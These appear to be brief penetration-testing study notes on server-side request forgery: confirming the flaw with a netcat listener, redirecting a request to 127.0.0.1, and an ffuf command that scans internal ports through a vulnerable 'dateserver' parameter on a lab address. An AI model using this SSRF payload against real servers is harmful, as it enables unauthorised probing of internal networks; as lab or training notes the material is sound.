1. Use Burp Suite to intercept requests
2. Find a request that makes a request to another server
3. Host our own server and make it call back to our server.
```
nc -lvnp 8000
```
- If server reaches out to us, it is vulnerable.
4. Change the URL to point to itself
  - http://127.0.0.1/index.php
 
**Port scanner with SSRF
```
seq 1 10000 > ports.txt
ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```
